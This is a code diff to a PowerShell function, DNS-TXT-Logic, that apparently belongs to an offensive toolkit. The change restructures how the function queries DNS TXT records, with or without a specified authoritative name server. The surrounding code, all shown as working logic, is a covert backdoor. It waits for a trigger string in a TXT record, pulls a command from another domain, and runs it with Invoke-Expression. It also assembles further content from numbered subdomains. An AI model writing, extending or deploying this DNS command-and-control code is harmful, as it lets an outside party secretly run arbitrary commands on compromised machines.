@@ -196,21 +196,29 @@ function DNS-TXT-Logic ($Startdomain, $cmdstring, $commanddomain, $psstring, $ps
     {
         $exec = 0
         start-sleep -seconds 5
-        $getcode = (Invoke-Expression "nslookup -querytype=txt $startdomain") 
+        
         if ($AuthNS -ne $null)
         {
             $getcode = (Invoke-Expression "nslookup -querytype=txt $startdomain $AuthNS") 
+        }
+        else
+        {
+            $getcode = (Invoke-Expression "nslookup -querytype=txt $startdomain") 
         }
         $tmp = $getcode | select-string -pattern "`""
         $startcode = $tmp -split("`"")[0]
         if ($startcode[1] -eq $cmdstring)
         {
             start-sleep -seconds 5
-            $getcommand = (Invoke-Expression "nslookup -querytype=txt $commanddomain") 
+            
             if ($AuthNS -ne $null)
             {
                 $getcommand = (Invoke-Expression "nslookup -querytype=txt $commanddomain $AuthNS") 
-            } 
+            }
+            else
+            {
+                $getcommand = (Invoke-Expression "nslookup -querytype=txt $commanddomain") 
+            }
             $temp = $getcommand | select-string -pattern "`""
             $command = $temp -split("`"")[0]
             $pastevalue = Invoke-Expression $command[1]
@@ -233,10 +241,14 @@ function DNS-TXT-Logic ($Startdomain, $cmdstring, $commanddomain, $psstring, $ps
             $i = 1
             while ($i -le $subdomains)
             {
-                $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$psdomain") 
+                
                 if ($AuthNS -ne $null)
                 {
-                    $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$psdomain $AuthNS") 
+                    $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$psdomain $AuthNS")
+                }
+                else
+                {
+                    $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$psdomain") 
                 }
                 $temp = $getcommand | select-string -pattern "`""
                 $tmp1 = ""
